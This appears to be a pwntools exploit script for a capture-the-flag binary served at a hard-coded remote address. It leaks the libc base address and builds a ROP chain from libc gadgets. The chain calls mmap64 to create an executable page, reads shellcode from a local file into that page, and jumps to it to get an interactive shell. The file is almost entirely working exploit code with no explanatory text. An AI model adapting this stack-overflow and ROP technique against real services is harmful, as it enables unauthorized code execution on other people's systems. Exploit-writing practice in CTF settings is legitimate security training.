#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('task')

host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11651)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
# pause()

data = io.recvuntil(b'/libc-2.31.so')
LIBC_BASE = int(data.split(b'\n')[-1].split(b'-')[0], 16)
io.recv()

# mmap64( 0x100000, 0x1000, 0x7, 0x22, 0xFFFFFFFFFFFFFFFF, 0x0)
# read( 0x1, 0x100000, 0x1000)

libc = ELF("./libc-2.31.so")
MMAP = libc.sym['mmap64'] + LIBC_BASE
READ = libc.sym['read'] + LIBC_BASE
POP_RDI = 0x000000000002679e + LIBC_BASE
POP_RSI = 0x00000000000288df + LIBC_BASE
POP_RDX = 0x00000000000cb28d + LIBC_BASE
POP_RCX = 0x000000000003b1b4 + LIBC_BASE
POP_R8 = 0x000000000012a976 + LIBC_BASE
POP_R15 = 0x000000000002679d + LIBC_BASE
POP_RBX = 0x0000000000030f6f + LIBC_BASE
MOV_R9_R15_CALL_RBX = 0x00000000000a9926 + LIBC_BASE

pl = cyclic(32)
pl += p64(0xdead)

# mmap64( 0x100000, 0x1000, 0x7, 0x22, 0xFFFFFFFFFFFFFFFF, 0x0)
pl += p64(POP_RDI)
pl += p64(0x100000)
pl += p64(POP_RSI)
pl += p64(0x1000)
pl += p64(POP_RDX)
pl += p64(0x7)
pl += p64(POP_RCX)
pl += p64(0x22)
pl += p64(POP_R8)
pl += p64(0xFFFFFFFFFFFFFFFF)
pl += p64(POP_R15)
pl += p64(0x0)
pl += p64(POP_RBX)
pl += p64(POP_RBX)
pl += p64(MOV_R9_R15_CALL_RBX)
pl += p64(MMAP)

# read( 0x1, 0x100000, 0x1000)
pl += p64(POP_RDI)
pl += p64(0x1)
pl += p64(POP_RSI)
pl += p64(0x100000)
pl += p64(POP_RDX)
pl += p64(0x1000)
pl += p64(READ)

# rip to Shellcode
pl += p64(0x100000)

shellcode = open("shell", "rb").read()
shellcode = shellcode.ljust(0x1000, b'\x00')

io.send(pl)
io.send(shellcode)

io.interactive()
